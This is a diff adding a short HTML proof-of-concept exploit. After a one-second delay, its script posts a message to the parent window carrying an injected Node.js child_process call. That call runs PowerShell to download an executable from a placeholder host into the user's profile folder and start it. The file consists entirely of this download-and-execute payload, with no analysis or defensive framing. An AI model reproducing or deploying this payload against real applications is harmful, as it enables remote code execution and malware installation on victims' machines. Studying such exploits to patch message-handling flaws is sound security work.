@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+
+setTimeout(() => {
+    const payload3 = 'test^@#require("child_process").execSync("powershell -Command \\"Invoke-WebRequest -Uri http://%s/%s -OutFile $env:USERPROFILE\\\\test.exe; Start-Process $env:USERPROFILE\\\\test.exe\\"")';
+    parent.postMessage(payload3, '*');
+
+
+}, 1000);
+
+
+</script>
